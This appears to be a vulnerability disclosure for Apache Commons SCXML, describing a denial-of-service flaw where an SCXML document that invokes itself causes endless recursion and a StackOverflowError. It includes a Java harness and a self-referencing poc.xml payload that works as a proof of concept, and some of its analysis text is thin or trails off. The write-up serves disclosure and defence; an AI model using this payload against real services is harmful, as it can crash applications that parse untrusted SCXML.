# Apache Commons-scxml Denial of Service Vulnerability

## 1. Project address
https://github.com/apache/commons-scxml
https://commons.apache.org/proper/commons-scxml

## 2. Project Introduction
ScXML is a working draft specification published by the World Wide Web Consortium (W3C). SCXML provides a common state machine-based execution environment based on the Harel state table. SCXML is a multi-markup language from W3C (see the latest working draft for details). Commons SCXML is a Java SCXML engine designed to create and maintain state machines that can execute defined state machines using SCXML documents while abstracting the environment interface.

## 3. Project Version
 master

## 4. Vulnerability details
For the specific payload, please refer to the following exploit, only analysis is done here
The function call analysis is as follows:
There is a go method in SCXMLExecutor, which calls another overloaded method go in the same category and passes in an empty Map. Use emptyMap() to create an unmodifiable empty Map
public void go() throws ModelException {
  this.go(Collections.emptyMap());
}

From the above analysis, we can see that the code completes a loop. However, this loop will not jump out, but will loop infinitely until the space is full and a StackOverflowError error is thrown. 
The call chain is as follows
![image](https://github.com/user-attachments/assets/abd10d70-4e04-4496-801a-d2520503f036)

## 5. Exploitation

There are two ways to use it. You can compile the source code and then import the jar package to build the project, or you can directly use the code editor to execute the main function;
The test source code is as follows:

```
import java.io.IOException;
import javax.xml.stream.XMLStreamException;
import org.apache.commons.scxml2.SCXMLExecutor;
import org.apache.commons.scxml2.io.SCXMLReader;
import org.apache.commons.scxml2.model.ModelException;
import org.apache.commons.scxml2.model.SCXML;

public class testDos {
  public static void main(String[] args) throws ModelException, XMLStreamException, IOException {
    SCXMLExecutor executor = new SCXMLExecutor();
    SCXML scxml = SCXMLReader.read("http://127.0.0.1:8888/poc.xml");
    executor.setStateMachine(scxml);
    executor.go();
  }
}
```

Poc.xml is as follows
```
<scxml xmlns="http://www.w3.org/2005/07/scxml" version="1.0">
    <parallel>
        <invoke src="poc.xml" content="poc" id="flag">
            <param name="flag" expr=" 100-7 "></param>
        </invoke>
    </parallel>
</scxml>
```

When executing the code, you can see a StackOverflowError error.

![image](https://github.com/user-attachments/assets/e6833060-fb1a-482a-86a5-ce19666aa11f)

Through performance analysis, it can be seen that the occupancy

![image](https://github.com/user-attachments/assets/6cf77c17-c386-46c1-84e5-0300a518266c)

![image](https://github.com/user-attachments/assets/89b16ca9-c750-49b0-a2e0-f833cee48fdd)

The memory usage is as follows

![image](https://github.com/user-attachments/assets/0261fc09-75d8-4b77-9b4d-3c92aa34f475)



